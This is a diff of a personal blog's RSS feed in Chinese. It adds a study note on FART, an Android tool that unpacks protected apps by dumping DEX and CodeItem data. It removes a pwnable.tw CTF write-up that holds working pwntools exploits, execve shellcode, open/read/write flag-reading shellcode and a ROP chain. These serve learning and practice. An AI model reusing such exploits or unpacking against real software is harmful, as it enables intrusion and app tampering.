@@ -380,6 +380,184 @@ console.log(decoded);
     </item>
     
     <item>
+      <title>FART 学习笔记</title>
+      <link>https://syang-ng.github.io/2020/01/learn-fart/</link>
+      <pubDate>Mon, 27 Jan 2020 20:55:33 +0800</pubDate>
+      
+      <guid>https://syang-ng.github.io/2020/01/learn-fart/</guid>
+      <description>
+
+&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;假期自学计划开启，就以分析 FART 源码开始。&lt;/p&gt;
+
+&lt;p&gt;FART 是看雪大牛 hanbingle 提出的一种基于主动调用开发的脱壳工具，工具的具体原理可以阅读帖子 &lt;a href=&#34;https://bbs.pediy.com/thread-252630.htm&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;FART：ART环境下基于主动调用的自动化脱壳方案&lt;/a&gt;，本文是结合该篇帖子和源码的学习笔记。&lt;/p&gt;
+
+&lt;p&gt;源码地址：&lt;a href=&#34;https://github.com/hanbinglengyue/FART，该代码是基于&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/hanbinglengyue/FART，该代码是基于&lt;/a&gt; Android 6.0 源码基础上修改而成的，加入了主动调用并修复函数的模块。&lt;/p&gt;
+
+&lt;h2 id=&#34;代码结构&#34;&gt;代码结构&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;art/runtime&lt;/code&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;interpreter&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;interpreter.cc&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;native&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;dalvik_system_DexFile.cc&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;art_method.cc&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;art_method.h&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;frameworks/base/core/java/android/app&lt;/code&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;ActivityThread.java&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;libcore/dalvik/src/main/java/dalvik/system&lt;/code&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;DexFile.java&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;FART 大体上就修改了源码中的这六个文件，加上 &lt;code&gt;fart.py&lt;/code&gt;  这个用于合并 Dex 结构体和 CodeItem 的脚本，共有七个文件。结合作者在帖子中的介绍，大概介绍下每个文件的作用：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;DexFile.java&lt;/code&gt; - 声明了 native 函数 &lt;code&gt;dumpMethodCode&lt;/code&gt;，该函数的作用是构造主动调用链，完成方法体的dump。&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;code&gt;dalvik_system_DexFile.cc&lt;/code&gt; - 实现了 &lt;code&gt;dumpMethodCode&lt;/code&gt; 函数，该函数会去主动调用 &lt;code&gt;myfartInvoke&lt;/code&gt; 函数&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;code&gt;interpreter.cc&lt;/code&gt; - 增加判断，当处于&lt;code&gt;&amp;lt;clinit&amp;gt;&lt;/code&gt; 阶段时，调用 &lt;code&gt;dumpDexFileByExecute&lt;/code&gt; 来进行 dump&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;code&gt;art_method.cc&lt;/code&gt; - 增加了两个函数 &lt;code&gt;dumpDexFileByExecute&lt;/code&gt; 和 &lt;code&gt;dumpArtMethod&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;code&gt;art_method.h&lt;/code&gt; - 声明  &lt;code&gt;get_method_idx&lt;/code&gt;，暴露出 dex_method&lt;em&gt;index&lt;/em&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;code&gt;ActivityThread.java&lt;/code&gt; - 获得 ClassLoader，获得 mCookie，再利用 mCookie 获得所有的类，然后主动遍历类的所有函数，进而提取出每个函数体的 CodeItem，至于为何采用该类作为入口点，可以参考作者的解释。&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;众所周知，对于一个正常的应用来说，最终都要由一个个的Activity来展示应用的界面并和用户完成交互，那么我们就可以选择在ActivityThread中的performLaunchActivity函数作为时机，来获取最终的应用的Classloader。选择该函数还有一个好处在于该函数和应用的最终的application同在ActivityThread类中，可以很方便获取到该类的成员。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;codeitem-抽取&#34;&gt;CodeItem 抽取&lt;/h2&gt;
+
+&lt;p&gt;从我对 Android 加固有限的认知来看，目前最为广泛普及的加固技术即为指令抽取，更为高级的 VMP 或者 Dex2C 由于性能问题并不会大范围应用，因此如果能有效地解决指令抽取问题，即可以解决 99% 的问题。&lt;/p&gt;
+
+&lt;p&gt;通常情况下，Java 类中的代码有两部分，一些代码只会在初始化阶段执行一次，因此针对 &lt;code&gt;＜clinit＞&lt;/code&gt; 需要进行特判并在执行时直接抽取 CodeItem 部分，而其他部分可以在主动调用过程中进行抽取。&lt;/p&gt;
+
+&lt;p&gt;针对这两部分，作者设计了不同的 dump 逻辑，分别如下：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;clinit&amp;gt;&lt;/code&gt; - &lt;code&gt;Execute&lt;/code&gt; =&amp;gt; &lt;code&gt;dumpDexFileByExecute&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;正常函数 - &lt;code&gt;DexFile_dumpMethodCode&lt;/code&gt; =&amp;gt; &lt;code&gt;myfartInvoke&lt;/code&gt; =&amp;gt; &lt;code&gt;Invoke&lt;/code&gt; =&amp;gt; &lt;code&gt;dumpArtMethod&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code&gt;dumpDexFileByExecute&lt;/code&gt; 的逻辑如下，可以看到主要还是在执行时立刻保存 artmethod 所对应的 Dex 结构：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;extern &amp;quot;C&amp;quot; void dumpDexFileByExecute(ArtMethod * artmethod)
+    SHARED_LOCKS_REQUIRED(Locks::mutator_lock_) {
+  
+    // 省略部分代码
+    if (szProcName[0]) {
+        const DexFile *dex_file = artmethod-&amp;gt;GetDexFile();
+        const uint8_t *begin_ = dex_file-&amp;gt;Begin();	// Start of data.
+        size_t size_ = dex_file-&amp;gt;Size();	// Length of data.
+      	// 继续省略代码
+        sprintf(dexfilepath,
+            &amp;quot;/sdcard/fart/%s/%d_dexfile_execute.dex&amp;quot;,
+            szProcName, size_int_);
+        int dexfilefp = open(dexfilepath, O_RDONLY, 0666);
+        if (dexfilefp &amp;gt; 0) {
+            close(dexfilefp);
+            dexfilefp = 0;
+        } else {
+            dexfilefp =
+                open(dexfilepath, O_CREAT | O_RDWR,
+                    0666);
+            if (dexfilefp &amp;gt; 0) {
+                write(dexfilefp, (void *) begin_,
+                        size_);
+                fsync(dexfilefp);
+                close(dexfilefp);
+            }
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;继续看 &lt;code&gt;dumpArtMethod&lt;/code&gt; 的逻辑：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;extern &amp;quot;C&amp;quot; void dumpArtMethod(ArtMethod * artmethod)
+    SHARED_LOCKS_REQUIRED(Locks::mutator_lock_) {
+    // 省略无关代码
+    if (szProcName[0]) {
+        // 省略代码
+        // 保存 Dex 结构
+        // 保存函数体
+        const DexFile::CodeItem * code_item =
+            artmethod-&amp;gt;GetCodeItem();
+        if (LIKELY(code_item != nullptr)) {
+            int code_item_len = 0;
+            uint8_t *item = (uint8_t *) code_item;
+            if (code_item-&amp;gt;tries_size_ &amp;gt; 0) {
+                const uint8_t *handler_data =
+                    (const uint8_t *) (DexFile::
+                                GetTryItems
+                                (*code_item,
+                            code_item-&amp;gt;
+                            tries_size_));
+                uint8_t *tail =
+                    codeitem_end(&amp;amp;handler_data);
+                code_item_len =
+                    (int) (tail - item);
+            } else {
+                code_item_len =
+                    16 +
+                    code_item-&amp;gt;
+                    insns_size_in_code_units_ * 2;
+            }
+            // 保存 codeitem 信息 &amp;lt;==&amp;gt; base64 形式
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在正常保存 Dex 代码外，程序还会将一个函数的 CodeItem 抽取出来并保存。&lt;/p&gt;
+
+&lt;h2 id=&#34;编译运行&#34;&gt;编译运行&lt;/h2&gt;
+
+&lt;p&gt;代码是基于 Android 6.0 的修改，因此我们可以自己编译 FART 工具并刷入自己的手机。然后找个带指令抽取的样本进行测试，脱壳结果如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;root@angler:/sdcard/fart/de.k3b.android.androFotoFinder # ls -al
+-rw-rw---- root     sdcard_rw 10139916 1970-01-11 02:22 10139916_dexfile_execute.dex
+-rw-rw---- root     sdcard_rw  2499359 1970-01-11 02:25 1835412_5597.bin
+-rw-rw---- root     sdcard_rw  1936402 1970-01-11 02:26 1835412_5724.bin
+-rw-rw---- root     sdcard_rw  1832365 1970-01-11 02:26 1835412_5732.bin
+-rw-rw---- root     sdcard_rw  1835412 1970-01-11 02:24 1835412_dexfile.dex
+-rw-rw---- root     sdcard_rw  1835412 1970-01-11 02:22 1835412_dexfile_execute.dex
+-rw-rw---- root     sdcard_rw   270916 1970-01-11 02:22 270916_dexfile_execute.dex
+-rw-rw---- root     sdcard_rw  4307272 1970-01-11 02:22 4307272_dexfile_execute.dex
+-rw-rw---- root     sdcard_rw     4906 1970-01-11 02:25 5109544_5597.bin
+-rw-rw---- root     sdcard_rw  5109544 1970-01-11 02:25 5109544_dexfile.dex
+-rw-rw---- root     sdcard_rw  5109544 1970-01-11 02:22 5109544_dexfile_execute.dex
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后利用 adb 将文件 pull 出来后，利用官方提供 fart.py 脚本可以尝试合并 dex 文件和相应的函数指令，可以看到相应效果为显示修复前 smali 代码和修复后 smali 代码：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/learn-fart/result.png&#34; alt=&#34;result&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;如果需要合并成新 dex 的话，需要结合 Dex 结构对脚本进行修改。&lt;/p&gt;
+
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://bbs.pediy.com/thread-252630.htm&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;FART：ART环境下基于主动调用的自动化脱壳方案&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
       <title>己亥年书摘</title>
       <link>https://syang-ng.github.io/2020/01/what-i-read-in-2019/</link>
       <pubDate>Fri, 24 Jan 2020 00:58:25 +0800</pubDate>
@@ -4495,310 +4673,6 @@ with open(&#39;true.so&#39;, &#39;w&#39;) as f:
 &lt;ol&gt;
 &lt;li&gt;&lt;a href=&#34;https://www.fortinet.com/blog/threat-research/unmasking-android-malware-a-deep-dive-into-a-new-rootnik-variant-part-i.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Unmasking Android Malware: A Deep Dive into a New Rootnik Variant, Part I&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://www.fortinet.com/blog/threat-research/unmasking-android-malware-a-deep-dive-into-a-new-rootnik-variant-part-ii.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Unmasking Android Malware: A Deep Dive into a New Rootnik Variant, Part II&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>pwnable.tw 入门 - start / orw / calc</title>
-      <link>https://syang-ng.github.io/2019/03/pwnable-tw-1.0/</link>
-      <pubDate>Sun, 10 Mar 2019 14:51:57 +0000</pubDate>
-      
-      <guid>https://syang-ng.github.io/2019/03/pwnable-tw-1.0/</guid>
-      <description>
-
-&lt;h2 id=&#34;start&#34;&gt;start&lt;/h2&gt;
-
-&lt;p&gt;查看汇编代码:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34;&gt;08048060 &amp;lt;_start&amp;gt;:
- 8048060:       54                      push   %esp
- 8048061:       68 9d 80 04 08          push   $0x804809d
- 8048066:       31 c0                   xor    %eax,%eax
- 8048068:       31 db                   xor    %ebx,%ebx
- 804806a:       31 c9                   xor    %ecx,%ecx
- 804806c:       31 d2                   xor    %edx,%edx
- 804806e:       68 43 54 46 3a          push   $0x3a465443
- 8048073:       68 74 68 65 20          push   $0x20656874
- 8048078:       68 61 72 74 20          push   $0x20747261
- 804807d:       68 73 20 73 74          push   $0x74732073
- 8048082:       68 4c 65 74 27          push   $0x2774654c
- 8048087:       89 e1                   mov    %esp,%ecx
- 8048089:       b2 14                   mov    $0x14,%dl
- 804808b:       b3 01                   mov    $0x1,%bl
- 804808d:       b0 04                   mov    $0x4,%al
- 804808f:       cd 80                   int    $0x80
- 8048091:       31 db                   xor    %ebx,%ebx
- 8048093:       b2 3c                   mov    $0x3c,%dl
- 8048095:       b0 03                   mov    $0x3,%al
- 8048097:       cd 80                   int    $0x80
- 8048099:       83 c4 14                add    $0x14,%esp
- 804809c:       c3                      ret
-
-0804809d &amp;lt;_exit&amp;gt;:
- 804809d:       5c                      pop    %esp
- 804809e:       31 c0                   xor    %eax,%eax
- 80480a0:       40                      inc    %eax
- 80480a1:       cd 80                   int    $0x80
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到汇编代码使用的是 &lt;code&gt;int 80&lt;/code&gt; 陷入中断的方式进行系统调用，这是 Linux 2.6 之前的通用做法，在这里贴一个 syscall 的相应链接供参考： &lt;a href=&#34;https://w3challs.com/syscalls/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://w3challs.com/syscalls/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;根据代码推测逻辑如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;void _start() {
-    char buf[20] = &amp;quot;Let&#39;s start the CTF:&amp;quot;;
-    sys_write(1,buf,20);
-    sys_read(0,buf,60);
-}
-void _exit() {
-    sys_exit();
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;很明显栈的长度有限因此如果输入长度超过 20 的话，能够导致栈溢出。因此我们只需要在栈上写入一段 shellcode 并通过控制程序控制流的方式即可 get shell，但这里有以下一个问题，由于 ASLR 的问题，无法获得栈的基地址。这也使得我们无法直接确认可以跳转的地址，因此需要泄露栈基地址。&lt;/p&gt;
-
-&lt;p&gt;此时发现有 &lt;code&gt;add    $0x14,%esp&lt;/code&gt; 可以得到栈的基地址(&lt;code&gt;esp&lt;/code&gt;)，因此如果修改返回地址，将程序返回到地址 &lt;code&gt;0x08048087&lt;/code&gt;，此时程序相当于执行了 &lt;code&gt;sys_write(1,esp,20)&lt;/code&gt;，就能泄露我们需要的栈地址了。剩下的工作则是编写 shellcode 和计算相应的偏移。&lt;/p&gt;
-
-&lt;p&gt;shellcode 对应的代码如下(这里参考了 DogeWatch&amp;rsquo;s Blog 的做法)，实际上的结果就是执行了 &lt;code&gt;execve(&amp;quot;/bin//sh&amp;quot;, NULL, NULL)&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34;&gt;31 c9                   xor    ecx,ecx
-f7 e1                   mul    ecx
-51                      push   ecx
-68 2f 2f 73 68          push   0x68732f2f
-68 2f 62 69 6e          push   0x6e69622f
-89 e3                   mov    ebx,esp
-b0 0b                   mov    al,0xb
-cd 80                   int    0x80
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;最终脚本如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
-
-DEBUG = False
-
-if DEBUG:
-    r = process(&amp;quot;./start&amp;quot;)
-else:
-    r = remote(&amp;quot;chall.pwnable.tw&amp;quot;, 10000)
-
-def leak():
-    print(r.recvuntil(&amp;quot;:&amp;quot;))
-    payload = &#39;a&#39;*20 + p32(0x08048087)
-    r.send(payload)
-    stack_addr = u32(r.recv(4))
-    print(&amp;quot;stack address is {}&amp;quot;.format(hex(stack_addr)))
-    return stack_addr
-
-def pwn(stack_addr):
-    shellcode = &#39;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#39;
-    payload = &#39;a&#39;*20 + p32(stack_addr+20) + shellcode
-    r.send(payload)
-
-def main():
-    stack_addr = leak()
-    pwn(stack_addr)
-    r.interactive()
-
-main()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;得到 FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}&lt;/p&gt;
-
-&lt;p&gt;思路回顾整理如下：&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;发现存在栈溢出 =&amp;gt; 栈溢出执行 shellcode&lt;/li&gt;
-&lt;li&gt;栈地址随意化 =&amp;gt; 泄露栈地址&lt;/li&gt;
-&lt;li&gt;根据栈地址编写 shellcode&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&#34;orw&#34;&gt;orw&lt;/h2&gt;
-
-&lt;p&gt;本题主要考查的是 shellcode 的编写能力，&lt;code&gt;orw&lt;/code&gt; 即为 &lt;code&gt;open&lt;/code&gt; / &lt;code&gt;read&lt;/code&gt; / &lt;code&gt;write&lt;/code&gt; 的三项基本操作。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
-
-shellcode = &#39;&#39;&#39;
-_start:
-    jmp end
-open:
-    pop ebx
-    mov ecx, 0
-    mov eax, 5
-    int 0x80
-    mov ebx, eax
-    mov ecx, esp
-    mov edx, 40
-    mov eax, 3
-    int 0x80
-    mov ebx, 1
-    mov eax, 4
-    int 0x80
-    mov eax, 1
-    int 0x80
-end:
-    call open
-&#39;&#39;&#39;
-
-r = remote(&#39;chall.pwnable.tw&#39;, 10001)
-
-shellcode = asm(shellcode)
-r.sendlineafter(&#39;:&#39;, shellcode+&amp;quot;/home/orw/flag\x00&amp;quot;)
-r.interactive()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;calc&#34;&gt;calc&lt;/h2&gt;
-
-&lt;p&gt;本题需要先理解程序的逻辑，利用 ida 查看对应源码：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/pwnable-tw-1.0/calc-calc.png&#34; alt=&#34;calc&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;可以很明显地看到程序的逻辑如下：&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;调用 &lt;code&gt;get_expr&lt;/code&gt; 函数过滤除了 +，-，*，/，% 和数字之外的其他字符&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;init_pool&lt;/code&gt; 函数会初始化保存中间数据的一段内存，这里我将其重命名为 &lt;code&gt;pool&lt;/code&gt; 方便理解&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;parse_expr&lt;/code&gt; 函数对表达式进行解析，并将结果写到 &lt;code&gt;pool&lt;/code&gt; 上&lt;/li&gt;
-&lt;li&gt;输出 &lt;code&gt;pool&lt;/code&gt; 上保存的最终值&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;下面一个函数则是程序的漏洞所在：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/pwnable-tw-1.0/calc-eval.png&#34; alt=&#34;eval&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;如果按照正常的执行过程，程序的结构如下：&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;pool[0] = 2&lt;/li&gt;
-&lt;li&gt;pool[1] = num1&lt;/li&gt;
-&lt;li&gt;pool[2] = num2&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;然后执行完后变成：&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;pool[0] = 1&lt;/li&gt;
-&lt;li&gt;pool[1] = num1 OP num2&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;但如果用户以 &lt;code&gt;+600&lt;/code&gt; 作为输入的话，则是如下结果：&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;pool[0] = 1&lt;/li&gt;
-&lt;li&gt;pool[1] = 600&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;执行完则成为：&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;pool[0] = 600&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;如果我们的输入是 &lt;code&gt;+600+300&lt;/code&gt;，则最终结果会变成 &lt;code&gt;pool[600] += 300&lt;/code&gt;, 由此触发了对栈上任意地址的写操作。&lt;/p&gt;
-
-&lt;p&gt;而且由于我们拥有的是任意地址写，所以可以绕过 canary 对栈的防护。很明显我们可以通过任意地址写来劫持程序的控制流，最终触发 &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;由于开启了 NX，栈上不能直接执行 shellcode，而且由于程序是静态链接的，因此不能通过修改 GOT 表的方式调用 sys 函数,所以需要通过 ROP 劫持控制流,进而通过 &lt;code&gt;int 0x80&lt;/code&gt; 进行系统调用。&lt;/p&gt;
-
-&lt;p&gt;在这之前，我们需要清楚程序的栈结构，这里可以参考 &lt;a href=&#34;https://www.freebuf.com/articles/others-articles/132283.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Pwnable.tw刷题之calc&lt;/a&gt;，个人认为其中的两个示意图非常清晰，易于理解。&lt;/p&gt;
-
-&lt;p&gt;最后需要构造的栈结构如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;pool[370] = u32(&amp;quot;/sh\x00&amp;quot;)
-pool[369] = u32(&amp;quot;/bin&amp;quot;)
-pool[368] = 0x08049a21 // int 0x80
-pool[367] = address    // &amp;quot;/bin/sh\x00&amp;quot; 字符串的地址
-pool[366] = 0
-pool[365] = 0x080701d1 // pop ecx;pop ebx;ret
-pool[364] = 0
-pool[363] = 0x080701aa // pop edx;ret
-pool[362] = 11
-pool[361] = 0x0805c34b // pop eax;ret
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;下面需要思考的则是如何获取 &lt;code&gt;&amp;quot;/bin/sh\x00&amp;quot;&lt;/code&gt; 字符串所指向的地址。我们可以通过保存在 &lt;code&gt;pool[360]&lt;/code&gt; 上的 &lt;code&gt;ebp&lt;/code&gt;，即 main 函数的栈基地址推算出字符串对应的地址，具体推算示意图如下：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/pwnable-tw-1.0/calc-stack.png&#34; alt=&#34;stack&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;构造脚本如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
-
-LOCAL = not True
-DEBUG = False
-
-if LOCAL:
-    r = process(&amp;quot;./calc&amp;quot;)
-    if DEBUG:
-        context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]
-        gdb.attach(proc.pidof(s)[0])
-else:
-    r = remote(&amp;quot;chall.pwnable.tw&amp;quot;, 10100)
-
-def leak():
-    payload = &amp;quot;+360&amp;quot;
-    r.sendline(payload)
-    base = int(r.recv().strip())
-    return base &amp;amp; 0xFFFFFFFF
-
-def get_ebp(base):
-    size = base - (base &amp;amp; 0xFFFFFFF0 - 16)
-    print(&amp;quot;base is {}&amp;quot;.format(hex(base)))
-    print(&amp;quot;stack size is {}&amp;quot;.format(size))
-    ebp = base - (size + 4) + 32
-    if ebp &amp;gt; 0x8FFFFFFF:
-        ebp -= 0x100000000
-    return ebp
-
-def write(pos, value):
-    payload = &amp;quot;+{}&amp;quot;.format(pos)
-    r.sendline(payload)
-    v1 = int(r.recv().strip())
-    v2 = value - v1
-    payload = &amp;quot;+{}{}{}&amp;quot;.format(pos, &#39;+&#39; if v2 &amp;gt; 0 else &#39;&#39;, v2)
-    r.sendline(payload)
-    r.recv()
-
-def pwn():
-    # leak
-    base = leak()
-    # 0x0805c34b : pop eax ; ret
-    write(361, 0x0805c34b)
-    write(362, 11)
-    # 0x080701aa : pop edx ; ret
-    write(363, 0x080701aa)
-    write(364, 0)
-    # 0x080701d1 : pop ecx ; pop ebx ; ret
-    write(365, 0x080701d1)
-    write(366, 0)
-    write(367, get_ebp(base))
-    # 0x08049a21 : int 0x80
-    write(368, 0x08049a21)
-    write(369, u32(&amp;quot;/bin&amp;quot;))
-    write(370, u32(&amp;quot;/sh\x00&amp;quot;))
-
-def main():
-    print(r.recvuntil(&amp;quot;=== Welcome to SECPROG calculator ===\n&amp;quot;))
-    pwn()
-    r.interactive()
-
-if __name__ == &#39;__main__&#39;:
-    main()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;小结&#34;&gt;小结&lt;/h2&gt;
-
-&lt;p&gt;花了一周来做（理解）这三道题，希望这次 pwn 的（再）入门能成功（残念&lt;/p&gt;
-
-&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;a href=&#34;http://dogewatch.github.io/2017/04/10/pwnable.tw-Part1/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;DogeWatch&amp;rsquo;s Blog | Pwnable.tw Part(1)&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://showlinkroom.me/2017/01/22/pwnable-tw/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;l1nk3dHouse | pwnable-tw&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.freebuf.com/articles/others-articles/132283.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Pwnable.tw刷题之calc&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.jianshu.com/p/d59a41d85af1&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Pwnable.tw calc&lt;/a&gt;&lt;/li&gt;
 &lt;/ol&gt;
 </description>
     </item>
